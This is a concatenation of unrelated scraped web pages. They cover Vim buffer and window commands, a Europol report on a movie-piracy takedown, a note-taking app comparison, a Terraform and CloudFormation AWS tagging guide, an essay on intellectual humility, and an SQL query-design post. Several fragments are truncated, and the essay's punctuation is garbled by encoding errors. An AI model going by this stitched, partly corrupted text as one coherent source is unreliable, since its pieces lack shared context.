<p>Use the commands <code>:bnext</code> ("buffer-next") and <code>:bprev</code> ("buffer-previous") to toggle forwards and backwards between your open buffers. You can treat each buffer as a regular old Vim session.</p>
<h2>7. Splitting windows</h2>
<p>Splitting windows is a step beyond using multiple buffers, because it allows you to see the contents of multiple files at the same time. Think of splitting windows as a frontend for viewing and working with multiple buffers at once.</p>
<p>If you're like me, you've probably split windows in Vim in the past, few and far between. And you probably always forget how to do it and are too lazy to look it up in the moment. Consider this an attempt to hammer it into your head - it's pretty dang simple:</p>
<ul>
<li>
<p>When you have a file open in Normal mode, use the command <code>:split file.ext</code> to create a <em>horizontal split</em> in the current window, displaying both the old and new files one above the other.</p>
</li>
<li>
<p>Use the command <code>:vsplit [file.ext]</code> to create a <em>vertical split</em> in the window, displaying both the old and new files side by side.</p>
</li>
<li>
<p>In Normal mode, press <code>&lt;CTRL-w&gt;w</code> (that means just press CTRL and tap 'w' twice) to toggle the active window.</p>
</li>
<li>
<p>Use the <code>:q</code> or <code>:wq</code> command to close out of the active window, which will allow the other window to take up the full screen.</p>
</li>
</ul>
<p>Fun fact - windows can be split and re-split multiple times - knock yourself out!</p>
<p><strong>Less memorizable BONUS</strong>: To lock scrolling for split windows so they scroll together, run the command <code>:set scrollbind</code> in each of them.</p>
<h2>Conclusion</h2>
<p>Vim's productivity is diminished if we have to constantly consult Google while working. We presented 7 Vim commands that are easy to commit to memory and will pay dividends in time-saved down the line.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>On 25 August, an alleged criminal network of copyright infringing hackers, mainly responsible for pirating movies and hosting illegal digital content worldwide was dismantled in a coordinated action between US authorities and their counterparts in 18 countries around the world, with Europol and Eurojust support. Sixty servers were taken down in North America, Europe and Asia and several of the main suspects were arrested.</p>
<h3>Streamed prior to release&nbsp;</h3>
<p>The Sparks Group obtained DVDs and Blu-ray discs of unreleased content and compromised the copyright protections on the discs to reproduce and upload the content publically to online servers. It is believed that the piracy group, under investigation since September 2016, had successfully reproduced and disseminated hundreds of movies and TV programmes prior to their retail release date, including nearly every movie released by major production studios in the US. The Sparks Group has caused tens of millions of US dollars in losses to film production studios, mainly to the US movie, television, and supporting industries, from the copyright infringement.&nbsp;</p>
<h3>False claims for free films</h3>
<p>To get ahead, members of the Sparks Group made several material misrepresentations and omissions to wholesale distributors. On many occasions, they claimed to be DVD and Blu-ray discs retailers and promised not to sell the content prior to the retail release date. Once they received the products, the members of the group used special software to crack the copyright protections to then reproduce and encode the content in high-definition. The content was then disseminated and reproduced on streaming platforms, peer-to-peer and torrent networks from their platforms.&nbsp;</p>
<p>The servers were located around the world in Canada, Czechia, Denmark, France, Germany, Latvia, the Netherlands, Norway, Poland, Portugal, Romania, South Korea, Spain, Sweden, Switzerland, and the United Kingdom. These were taken down in yesterday’s action and in the days preceding it, with the help of national authorities from these countries. Other measures were also taken in Italy, Romania and Canada. One of the members of the alleged criminal network was arrested over the weekend in Cyprus and another suspect was arrested yesterday in the US. &nbsp;</p>
<h3>International cooperation</h3>
<p>This successful operation was possible thanks to the extensive international cooperation facilitated by Europol and Eurojust between law enforcement and judicial authorities from the countries involved. Europol enhanced the exchange of information through the participating countries and coordinated the action day with Eurojust which hosted yesterday’s a coordination centre, ensuring real-time coordination in the joint action of the national authorities in all the countries. An operational meeting at Europol and a coordination meeting at Eurojust were organised prior to the joint action day, facilitating the exchange of information between law enforcement and judicial authorities and setting a joint strategy between all the parties involved. Europol provided analytical support during the investigation and supported the information exchange between the involved police authorities via the SIENA secure communication system.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Notion: My Life OS</h2><p>As far as flexibility and personalization, Notion takes the cake. Unlike Evernote, each page in Notion is composed of blocks – blocks that can be uniquely shaped and created to do exactly what you want them to do.<br></p><p>Want a bullet point? Add a block. Need a checkbox? Add a block. Want to make an H1 heading? You guessed it, another block.<br></p><p>Everything in my Notion revolves around my Life Dashboard. The dashboard is a compilation of linked pages for different areas of my life such as my Youtube channel, my weekly Newsletter, and freelance video editing.<br></p><p>Along with my life silos, I have pages created for projects that I’m working on, a master database for all the books I’m either currently reading or have read, and a master goals page.&nbsp;<br></p><p>&nbsp;I use my dashboard as a landing page for my life. Whenever I need to access some notes, figure out what video to make, or blog post to write next, I navigate to my dashboard and begin cranking out work like a productivity grease monkey.<br></p><h2>Obsidian: Live Notes &amp; Ideas</h2><p>Obsidian is the holding tank for all my notes on articles, books, podcasts, and ideas. Obsidian’s structure, or lack thereof, makes it easy to link notes together manually or automatically with the backlink functionality.<br></p><p>&nbsp;A typical article will have anywhere from 5 to 30 backlinks, depending on its length. I backlink most nouns such as companies, names, and key terms. Doing so adds a unique function that most note taking apps can’t give – serendipity. Let me explain.<br></p><p>If I’m taking notes on an article written by David Perell that mentions the key terms Gardner, Librarian, and Architect, I will most likely back link each of those. When I click into each key terms page and show backlinks, I see the reference that David Perell made to it. However, because I took notes on that exact topic on a different article from Ness Labs, those notes will show there as well.<br></p><p>I now have two different sources talking about the same topic in my personal wiki. From here, I can read both articles and synthesize, or try and create my own take on the Gardner, Architect, Librarian philosophy. This doesn’t typically happen in rigid note taking apps such as Evernote or OneNote unless you manually think, “Ah, these two terms are related.”</p><h2>Evernote: Set it and Forget it</h2><p>Evernote, or as I like to call it, ‘Ol Reliable.&nbsp;<br></p><p>Evernote has been around a long time, and, along with Word, Evernote made massive waves in the Personal Knowledge/Information Management field. Founded in 2004, it was one of the first companies to adopt smartphone operating procedures. Within a few years, Evernote was seeing incredible success and <a href="https://www.nytimes.com/2019/06/28/business/evernote-what-happened.html">most thought they were headed</a> toward a great IPO.<br></p><p>Because it has been around so long, people depend on Evernote to store a plethora of information, which it does quite well. However, the hierarchical structure of Evernote makes it hard to manipulate notes like in Obsidian. Additionally, its rigid format doesn’t allow for the same degree of personalization as Notion.<br></p><p>Although I use both Obsidian and Notion already, I do use Evernote as well. Evernote has insanely accurate Optical Character Recognition (OCR for short), which makes it a great tool to store important documents or receipts.&nbsp;<br></p><p>OCR means Evernote can search the actual text on a PDF or JPEG, instead of just searching the text that was written in the program like Notion or Obsidian do. This makes it invaluable to store house documents, receipts you might not want to throw away, or handbooks you want to get out of storage; this is exactly what I use Evernote for.<br></p><p>When you signing up, Evernote creates a custom email for each user. When emails or attachments are sent to this email, they automatically appear in the Inbox section of Evernote. From there, you can drag and drop the file to the appropriate folder. This has been game changing in regards to getting all my important docs saved because I can easily snap a photo on my phone, use the text expander feature on IOS to get my Evernote email address, and it’s on it’s way.&nbsp;<br></p><div><p>Thomas Edison would lose his mind if he had these features when inventing that lightbulb.</p></div><h3><strong>Task Manager/Reminders</strong></h3><p>The best feature in any task manager is quick capture. Think, “quick capture is queen”. That’s why I use Things3.<br></p><h2>Things3: Basically Wizardry</h2><p>Things3 is an <em>incredible </em>task manager. Its quick capture feature, its automatic imports from reminders, its ability to add different projects and areas, and its inbox/today view blow any other task manager out of the water.<br></p><p>I use Things3 as a quick capture tool when I’m at my desk or anywhere else on my laptop. If I come across an article I want to read, a video I want to watch, or a company I want to research, instead of doing that in the moment and ruining the flow of work, I add a new task to my inbox.<br></p><p>By simply pressing CTRL + SPACE, a small window in the center of the screen appears.

                <!-- Toc if any -->            
                
                <!-- End Toc -->
				

<p>Once <a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">you have adopted an AWS tagging strategy</a>, you’ll need to make sure that all your existing AWS resources and any new ones you create abide by it. Consistency is the key - if you don’t proactively enforce your AWS tagging strategy, you’ll always be playing catch up and chasing down team members to make sure they add the right tags to their resources.</p>

<p>While you can apply AWS tags to your resources manually using the <a href="https://docs.aws.amazon.com/cli/latest/reference/resourcegroupstaggingapi/tag-resources.html" target="_blank">AWS CLI</a> or <a href="https://docs.aws.amazon.com/ARG/latest/userguide/tag-editor.html" target="_blank">AWS Tag Editor</a>, you’ll probably find this cumbersome and error-prone at scale. A better approach is to automatically apply AWS tags to your resources and use rules to enforce their consistent usage.</p>

<p>Depending on the tool you use to maintain your infrastructure on AWS, your method of proactively enforcing AWS tags on new resources may vary. In this guide, I’ll highlight two tools: Terraform and AWS CloudFormation. You’ll see how to use each to create and update AWS cost allocation tags on your resources and then enforce the proper use of specific tags for new resources. By proactively enforcing your AWS tagging strategy, you’ll minimize your time spent auditing and correcting improper AWS tags and force developers to learn best AWS tagging best practices for your environment.</p>



<p>The first infrastructure management tool I’ll cover is <a href="https://www.terraform.io/" target="_blank">Terraform</a>. Terraform works across a variety of cloud hosting providers to help you provision and maintain your AWS resources. With Terraform, you can define your servers, databases, and networks in code and apply your changes programmatically to your AWS account.</p>

<p>If you’re new to Terraform, they have a well-documented <a href="https://learn.hashicorp.com/terraform/getting-started/intro" target="_blank">Getting Started guide</a> and several <a href="https://github.com/terraform-providers/terraform-provider-aws/tree/master/examples" target="_blank">AWS template examples on GitHub</a>. In this section, I’ll show you some snippets from a demo Terraform project and module that <a href="https://github.com/CloudForecast/cf-terraform-demo" target="_blank">is available on GitHub</a>. You’ll learn the following in this Terraform AWS tags:</p>

<ol>
  <li>Tag a New AWS EC2 Instance with Terraform</li>
  <li>Using Terraform to Update Existing AWS Tags</li>
  <li>Enforce AWS Tags with Terraform</li>
</ol>

<h3 id="tag-a-new-aws-ec2-instance-with-terraform">Tag a New AWS EC2 Instance with Terraform</h3>

<p>If you want to deploy an EC2 instance with AWS Tags using Terraform, your configuration might include something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>resource "aws_instance" "cart" {
  connection {
    type = "ssh"
    user = "ubuntu"
    host = self.public_ip
    private_key = file(var.private_key_path)
  }

  instance_type = "t2.micro"

  ami = var.aws_amis[var.aws_region]

  key_name = aws_key_pair.auth.key_name

  vpc_security_group_ids = [aws_security_group.default.id]

  subnet_id = aws_subnet.default.id

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get -y update",
      "sudo apt-get -y install nginx",
      "sudo service nginx start",
    ]
  }
  tags = {
    contact = "j-mark"
    env = "dev"
    service = "cart"
  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above example includes three AWS cost allocation tags: <code>contact</code>, <code>env</code>, and <code>service</code> with values described as strings. When you <a href="https://www.terraform.io/docs/commands/apply.html" target="_blank">apply this configuration</a>, Terraform will connect to AWS and deploy an EC2 instance having the AWS tags you specified.</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383259429_cf-2020-08-02-a.png" alt=""></p>

<h3 id="using-terraform-to-update-existing-aws-tags">Using Terraform to Update Existing AWS Tags</h3>

<p>Terraform makes it easy to update already existing resources with AWS tags in reversible and consistent ways. If you’re using AWS tags to keep track of a resource’s contact (e.g.: <code>j-mark</code> in the above example), you’re likely to need to update the AWS tag when the team member leaves or changes roles.</p>

<p>To update the AWS tags on your resource, simply update the corresponding tags in your Terraform configuration. The new tags will overwrite any previous tags assigned to the resource, including tags added outside of Terraform.</p>

<p>For example, to change the <code>contact</code> cost allocation tag on the EC2 instance above, you might update the <code>tags</code> block above with the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>tags = {
  contact = "l-duke"
  env = "dev"
  service = "cart"
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When you apply this configuration, the AWS tags will be automatically updated in the AWS console:</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383277121_cf-2020-08-02-b.png" alt=""></p>

<p>If you keep your Terraform configuration files in version control - which is probably a good idea - you will be able to see how tags have changed over time. You can also review changes using the same code review process that your application code goes through to help you catch mistakes in the execution of your tagging strategy.</p>

<h3 id="enforce-aws-tags-with-terraform">Enforce AWS Tags with Terraform</h3>

<p>As your infrastructure grows, a code review process likely won’t be enough to prevent improper AWS tagging. Fortunately, you can enforce AWS tag names and values using <a href="https://www.terraform.io/docs/configuration/variables.html" target="_blank">variables</a> and custom validation rules in Terraform.</p>

<p>In the examples above, the <code>tags</code> list was hard-coded into the EC2 instance definition. A more scalable pattern would be to break your EC2 instance template into its own <a href="https://www.terraform.io/docs/configuration/modules.html" target="_blank">module</a> and use a <code>tags</code> variable. You can then write a <a href="https://www.terraform.io/docs/configuration/variables.html#custom-validation-rules" target="_blank">custom validation rule</a> to check that the tags comply with your strategy.</p>

<p>For example, if you want to check that:</p>

<ol>
  <li>The user specifies at least one tag</li>
  <li>The <code>contact</code> tag is either <code>j-mark</code> or <code>l-duke</code></li>
  <li>The <code>env</code> tag is set</li>
  <li>The <code>service</code> tag is either <code>cart</code> or <code>search</code></li>
</ol>

<p>You might create a module with a variable specified like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>variable "tags" {
  description = "The tags for this resource."
  validation {
    condition = length(var.tags) &gt; 0 &amp;&amp; contains(["j-mark", "l-duke"], var.tags.contact) &amp;&amp; var.tags.env != null &amp;&amp; contains(["cart", "search", "cart:search"], var.tags.service)
    error_message = "Invalid resource tags applied."

  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now when you run <code>terraform plan</code> with a missing or invalid tag, you’ll get an error:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>Error: Invalid value for variable
...
Invalid resource tags applied.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your rules can be as complex as <a href="https://www.terraform.io/docs/configuration/index.html" target="_blank">Terraform’s Configuration Language</a> allows, so functions like <code>regex()</code>, <code>substr()</code>, and <code>distinct()</code> are all available. That said, there are some caveats to this approach.</p>

<p>First, custom variable validation is an experimental feature in Terraform. <a href="https://www.terraform.io/docs/configuration/terraform.html#experimental-language-features" target="_blank">Experimental features</a> are subject to change, meaning that you might need to pay attention to Terraform update mores closely. To enable <code>variable_validation</code>, add the following to your <code>terraform</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>terraform {
  experiments = [variable_validation]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Second, Terraform’s variable validation only happens during the <code>terraform plan</code> phase of your infrastructure’s lifecycle. It can’t prevent users from accidentally changing your tags directly in the AWS console, and it’s only as good as the validation rules you write. If you start using a new resource but forget to add validation rules, you might end up with lots of resources that don’t adhere to your tagging strategy.</p>

<p>Another option for paid Terraform Cloud customers is <a href="https://www.terraform.io/docs/cloud/sentinel/index.html" target="_blank">Sentinel</a>, which allows you to create custom policies for your resources. I won’t cover this method here, but Terraform has created an <a href="https://www.terraform.io/docs/cloud/sentinel/examples.html" target="_blank">example policy</a> to show you how to enforce mandatory AWS tags.</p>



<p>Similar to Terraform, AWS <a href="https://aws.amazon.com/cloudformation/" target="_blank">CloudFormation</a> lets you provision AWS resources based on configuration files. Unlike Terraform, CloudFormation is part of Amazon’s offerings, so it won’t necessarily help you if you want to use another infrastructure provider. The approach to tagging your resources in CloudFormation is similar to that used by Terraform, but as you’ll see, the configuration format is different.</p>

<p>If you’re new to AWS CloudFormation, <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/GettingStarted.Walkthrough.html" target="_blank">Amazon’s official walkthrough</a> will help you get started deploying some basic templates. In this section, I’ll show you some snippets from a demo AWS CloudFormation template which is <a href="https://github.com/CloudForecast/cf-cloudformation-demo" target="_blank">also available on GitHub</a>. You’ll learn the following in this Terraform AWS tags section:</p>

<ol>
  <li>AWS CloudFormation Template to Deploy Tags</li>
  <li>Using CloudFormation to Update AWS Tags</li>
  <li>CloudFormation Template to Enforce AWS Tags</li>
</ol>

<h3 id="aws-cloudformation-template-to-deploy-tags">AWS CloudFormation Template to Deploy Tags</h3>

<p>AWS CloudFormation is designed to make it easy to create AWS resources with a single template file. Using a CloudFormation template, every resource that can be deployed with an AWS tag.</p>

<p>For example, to create a new EC2 instance with the same three AWS tags used in the Terraform example above, add an array of <code>Tags</code> to the resource’s <code>Properties</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9

11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td><pre>"Resources" : {
  "WebServerInstance": {  
    "Type": "AWS::EC2::Instance",
    "Metadata" : {...},
    "Properties": {
      "Tags" : [
       {
          "Key" : "contact",
          "Value" : "j-mark"
       },
       {
          "Key" : "env",
          "Value" : "dev"
       },
       {
          "Key" : "service",
          "Value" : "cart"
       }
      ],
      ...       
    }
  },
  ...         
},
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a>, you can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/create-stack.html" target="_blank">deploy this CloudFormation template as a new stack</a>. This will ensure your template is valid and create the specified resources with their tags on AWS:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you have lots of similar resources in your template, you can deploy AWS tags to all the resources in the stack at once using the <code>--tags</code>  flag with the <code>create-stack</code> or <code>update-stack</code> commands:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre># Creating a stack with tags
aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"

# Updating a stack with tags
aws cloudformation update-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="using-cloudformation-to-update-aws-tags">Using CloudFormation to Update AWS Tags</h3>

<p>If you want to change the contact on your EC2 instance created above, simply change the <code>Tags</code> section of your template file and use the <code>[update-stack](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html)</code> <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html" target="_blank">command</a> to deploy your changes.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>"Tags" : [
 {
    "Key" : "contact",
    "Value" : "l-duke"
 },
  ...
],
</pre></td></tr></tbody></table></code></pre></div></div>

<p>AWS CloudFormation behaves the same way that Terraform does when you update tags outside your template file. Any tags set manually will be overridden by the <code>update-stack</code> …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>The Japanese Zen term <em>shoshin</em> translates as â€˜beginnerâ€™s mindâ€™ and refers to a paradox: the more you know about a subject, the more likely you are to close your mind to further learning. As the Zen monk Shunryu Suzuki put it in his book <em>Zen Mind, Beginnerâ€™s Mind</em> (1970): â€˜In the beginnerâ€™s mind there are many possibilities, but in the expertâ€™s there are few.â€™</p>
<p>Many historical examples demonstrate how the expert mind (or feeling like an expert) can lead to closed-mindedness and the obstruction of scientific progress. In 1912, for instance, when the German geophysicist and explorer Alfred Wegener proposed â€“ counter to the received wisdom of the day â€“ that the Earth is made up of shifting continental plates, he was ridiculed by expert geologists around the world. His German compatriots referred to his â€˜delirious ravingsâ€™ while experts in the United States accused him of peddling pseudoscience. It would take decades before the orthodoxy was overturned and the accuracy of his theory was acknowledged.</p>
<p>Similar stories abound. In my own field of neuroscience, for example, belief in the legendary Spanish neuroscientist Santiago RamÃ³n y Cajalâ€™s â€˜harsh decreeâ€™ that adult humans are unable to grow new neurons persisted for decades in the face of mounting contradictory evidence.</p>
<p>Intellectual hubris doesnâ€™t afflict only established scientific experts. Merely having a university degree in a subject can lead people to grossly overestimate their knowledge. In one pertinent <a href="https://onlinelibrary.wiley.com/doi/full/10.1111/cogs.12280">study</a> in 2015, researchers at Yale University asked graduates to estimate their knowledge of various topics relevant to their degrees, and then tested their actual ability to explain those topics. The participants frequently overestimated their level of understanding, apparently mistaking the â€˜peak knowledgeâ€™ they had at the time they studied at university for their considerably more modest current knowledge.</p>
<p>Unfortunately, just as Suzuki wrote and as historical anecdotes demonstrate, there is research evidence that even <em>feeling</em> like an expert also breeds closed-mindedness. Another <a href="https://www.sciencedirect.com/science/article/abs/pii/S0022103115001006?via">study</a> involved giving people the impression that they were relatively expert on a topic (for example, by providing them with inflated scores on a test of political knowledge), which led them to be less willing to consider other political viewpoints â€“ a phenomenon the researchers called â€˜the earned dogmatism effectâ€™.</p>
<p>The consequences of intellectual overconfidence can be seen in the debates surrounding controversial contemporary issues. Take the matter of genetically modified (GM) foods, which are overwhelmingly considered to be safe based on current scientific knowledge. Research has <a href="https://www.nature.com/articles/s41562-018-0520-3">shown</a> that people who hold the strongest anti-GM views, believing that they are harmful, are the most inclined to overestimate their relevant knowledge. Â­</p>
<p>Approaching issues with a beginnerâ€™s mind or a healthy dose of intellectual humility can help to counter the disadvantages of intellectual hubris. People who are more intellectually humble <a href="https://www.tandfonline.com/doi/full/10.1080/17439760.2019.1579359">actually</a> know more, presumably because they are more receptive to new information. Similarly, being intellectually humble is associated with open-mindedness and a greater willingness to be receptive to other peopleâ€™s perspectives â€“ arguably just the tonic that our politically febrile world needs today.</p>
<p>Therefore, fostering your own beginnerâ€™s mind will help you to become more knowledgeable, less overconfident and more willing to engage with others â€“ traits that are also increasingly sought after by leading employers. By practising being flexible rather than dogmatic, more humble and less brazen, you will be sensitive to other peopleâ€™s perspectives and needs, making you a better sister, brother, father, mother, partner and friend. With eyes and mind wide open, itâ€™s so much easier to enjoy the wonders of the world, to grow, to learn and to listen.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>An important first step towards having a more open mind is to establish a realistic sense of your own knowledge. Countless studies have shown that most of us overestimate our understanding of various topics, everything from how a vacuum cleaner works to the detail of political policies â€“ a phenomenon <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3062901/">called</a> â€˜the illusion of explanatory depthâ€™. Fortunately, there is a very simple way to address this form of intellectual overconfidence and that is to make the effort to explain a relevant issue or topic to yourself or someone else in detail, either out loud or in writing. This exercise makes the gaps in our knowledge more apparent and bursts the illusion of expertise.</p>
<p>If embarking on a full-on explanation sounds impractical or overly arduous, there is a shorthand version you can try. In 2016, psychologists at Washington and Lee University in Virginia <a href="http://dx.doi.org/10.1037/xge0000161">showed</a> that the same beneficial effect could be achieved simply by spending a few seconds reflecting on your ability to explain a given issue to a true expert â€˜in a step-by-step, causally connected manner, with no gaps in your storyâ€™.</p>
<p>Another major hurdle to being open-minded is that we are naturally inclined to seek out information that supports our current views and beliefs â€“ a human foible known as â€˜confirmation biasâ€™. This perpetuates closed-mindedness and makes us ever surer of our own knowledge.</p>
<p>To combat confirmation bias, be aware of it. Constantly remind yourself that it exists, and take active steps to work against it by seeking out information and perspectives that contradict your current position. A <a href="https://psycnet.apa.org/record/1981-07049-001">study</a> published way back in 1980 suggested that actively challenging yourself in this way can be beneficial. Volunteers were presented with trivia questions, such as â€˜the Sabines were part of (a) ancient India or (b) ancient Romeâ€™, and then asked to rate the likelihood that their answers were correct. As expected, the volunteers tended to be overconfident in the accuracy of their answers. However, the researchers found that it was possible to reduce this overconfidence simply by asking their volunteers to list one reason why each of their chosen answers might be wrong. â€˜People who are interested in properly assessing how much they know should work harder in recruiting and weighing evidence,â€™ the researchers wrote. â€˜However, that extra effort is likely to be of little avail unless it is directed toward recruiting contradicting reasons.â€™</p>
<p>The way you think about intelligence and expertise is also relevant to being more open-minded. â€˜Growth mindset theoryâ€™ argues that if we see aptitudes as malleable rather than fixed we are able to learn better. Although the implementation of this theory in formal education has come in for some criticism lately, many continue to see value in the concept, and there is a persuasive logic to the idea that peopleâ€™s perspective on the nature of intelligence is likely to encourage their own intellectual humility.</p>
<p>A series of <a href="https://www.tandfonline.com/doi/full/10.1080/15298868.2017.1361861">studies</a> published in 2018 supported this view, showing that people who were more intellectually humble also tended to have a â€˜growth mindsetâ€™ toward intelligence. This makes sense â€“ if you take the view that intelligence is something youâ€™re either blessed with or youâ€™re not, then acknowledging (or actively seeking to expose) the gaps in your own knowledge and wisdom might be threatening, serving as apparent evidence of your intellectual inferiority. Conversely, if you see intelligence as something to be developed, then finding holes in your knowledge is not so threatening: instead, it opens up exciting new opportunities for learning.</p>
<p>Promisingly, that same 2018 paper showed that it might be possible to foster intellectual humility by encouraging a growth mindset. Asking volunteers to read a scientific article about the malleability of intelligence led them to score higher on a measure of intellectual humility and to be more open to other perspectives, as compared with a control group. â€˜This study suggests that intellectual humility can be at least temporarily enhanced, and points to a growth mindset as a set of beliefs that seems capable of doing so,â€™ the researchers said.</p>
<p>A final, more pleasurable step you can take to increase your intellectual humility comes in the form of deliberately invoking in oneself the emotion of awe. Several studies have shown that awe quietens the ego and prompts epistemological openness â€“ that is, a greater willingness to look at things differently and to recognise the gaps in oneâ€™s knowledge. The emotion also seems to reduce peopleâ€™s need to be satisfied by definite, closed arguments.</p>
<p>Consider a series of <a href="https://psycnet.apa.org/fulltext/2019-46364-001.html">studies</a> published in 2019 that involved volunteers watching awe-inspiring videos of nature or of the night skies â€“ doing so led them to hold beliefs about capital punishment with less conviction; to see political debates as less polarised; and to be more willing to engage with others holding opposing views on immigration. Another <a href="https://www.tandfonline.com/doi/full/10.1080/02699931.2019.1585331">paper</a> published the same year, and that used nature videos and a virtual-reality experience of the aurora borealis to induce awe, found that the emotion led volunteers to be more aware of the gaps in their knowledge, and to take a keener interest in science. Paraphrasing Albert Einstein, the researchers wrote that â€˜one who never experiences awe ceases to discoverâ€™. The message is simple: to increase your open-mindedness, try taking the time to gaze in wonder at the stars.</p></div></div></section><section><div><h2 data-guide-section-number="3"><span>Key points</span></h2><div><ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<p>
	After working for a few years on data analytics and processing, there seems to be a contradiction in the way SQL supports large and complex queries, and I've heard similar echoes from several others. I'll call this the <b>Vanishing Schema Paradox</b>:
</p>
<blockquote>
	<p>
		In a large SQL query, fundamental concepts such as <em>«this is the table of all widgets»</em> vanish after the first few lines.
	</p>
</blockquote>
<p>
	Or, in slightly more formal terms:
</p>
<blockquote>
	<p>
		In a large SQL query, the proportion of tables that come from the database schema decreases as the SQL query grows. 
	</p>
</blockquote>
<p>
  This is quite disappointing. After time and effort spent cleaning and documenting the database schema, most tables only last for a few short lines in a typical query. 
</p>
<p>
	The cause should not surprise anyone familiar with SQL. The simple concept of <em>«compute this value for each widget»</em> is actually not supported by SQL queries: there is no way to add a column to the widget table. Instead, SQL lets you create a new table with <code>SELECT</code>, a clone table that includes the new column in addition to the old ones. The rest of the query then manipulates the clone and never touches the original table again.
</p>
<p>
	To give a more concrete example, consider a simple report: 
</p>
<blockquote>
	<p>
		Given a <code>Products</code> table with a <code>Target</code> column and an <code>Orders</code> table with a <code>Quantity</code> column, find the ratio of products for which the total 2019 sales exceeded their target.
	</p>
</blockquote>
<p>
	Here's a solution in three steps, numbered from the inside out: 
</p>
<pre><code><span>3&gt;  SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END)
3&gt;  FROM (</span>
<span>2&gt;    SELECT SUM(Orders.Sales) AS Products.Total2019Sales</span>
<span>1&gt;    FROM Products
1&gt;    LEFT JOIN Orders ON Products.PId = Orders.PId AND Orders.Year = 2019</span>
<span>2&gt;    GROUP BY Products.PId</span>
<span>3&gt;  ) AS P</span>
</code></pre>
<ol>
	<li>
		<p>
			Left-join the products and orders tables. This creates a new table, because SQL is about relational algebra, and relational algebra is about creating new relations from old relations, and the distinction between tables and relations is irrelevant to the paradox.
		</p>
	</li>
	<li>
		<p>
			Aggregate by product the <code>Orders.Quantity</code> values from the new table, resulting in a new table P. We will <em>pretend</em> that table P is the same as <code>Products</code>, because it contains the same lines and can (if we choose to) include the same columns as well, in addition to the new column <code>Total2019Sales</code>.
		</p>
	</li>
	<li>
		<p>
			Aggregate table P to the ratio of products where <code>Total2019Sales &gt;= Target</code>. 
		</p>
	</li>
</ol>
<p>
	Out of three named tables (<code>Products</code>, <code>Orders</code> and <code>P</code>), only two tables appear in the database schema. 
</p>
<p>
	I'm not complaining ! For a small query, and with a few comments, this is <em>fine</em>. Most relational algebra operations are intuitive, given enough SQL experience. 
</p>
<p>
	The pain appears when growing beyond that. Let's say an additional request comes for the report: 
</p>
<blockquote>
	<p>
		Using the <code>Category</code> column, compute the ratio of products which exceeded their target across: 
	</p>
	<ol>
		<li>
			<p>all categories where over 50% of products reached their targets, </p>
		</li>
		<li>
			<p>all other categories. </p>
		</li>
	</ol>
</blockquote>
<p>
    If the <code>Total2019Sales</code> column was part of the Products table, this would be easy:
</p>
<pre><code><span>3&gt;  SELECT AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END), C.Over50</span>
<span>2&gt;  FROM Products P 
2&gt;  INNER JOIN (</span>
<span>1&gt;    SELECT 
1&gt;      P.Category, 
1&gt;      AVG(CASE WHEN P.Total2019Sales &gt;= P.Target THEN 1 ELSE 0 END) &gt; 0.5 as Over50
1&gt;    FROM Products P
1&gt;    GROUP BY P.Category</span>
<span>2&gt;  ) C ON P.Category = C.Category</span>
<span>3&gt;  GROUP BY C.Over50</span>
</code></pre>
<ol>
	<li>
		<p>
			Group the Products table by category, resulting in a new table C. The column <code>Over50</code> is true for categories where over 50% of products reached their targets.
		</p>
	</li>
	<li>
		<p>
			Join the Products table with table C. This results in a new table which we will again <em>pretend</em> is the same as the Products table, with the addition of the <code>Over50</code> column. 
		</p>
